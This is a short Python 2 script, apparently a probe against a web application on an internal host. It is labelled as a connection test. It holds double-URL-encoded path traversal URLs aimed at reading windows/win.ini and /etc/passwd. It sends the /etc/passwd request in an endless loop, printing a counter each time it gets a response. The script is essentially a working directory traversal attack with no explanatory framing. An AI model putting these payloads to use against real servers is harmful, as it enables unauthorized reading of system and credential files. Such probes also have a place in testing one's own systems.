__author__ = 'Solosus'

import urllib2
import time

def test_connService():
    o="http://www.baidu.com"
    t3 = "http://192.168.4.220:8094/v2t/teacher/input.htm"
    t = "http://192.168.4.220:8094/v2t//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini"
    t2 ="http://192.168.4.220:8094/v2t//..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc/passwd"
    url = t2
    ts = 0
    while True:
        try:
            response = urllib2.urlopen(url)
            html = response.read()
            ts = ts + 1
            print "....connected......%s" % ts
            time.sleep(1)
        except Exception,e:
            print e


test_connService();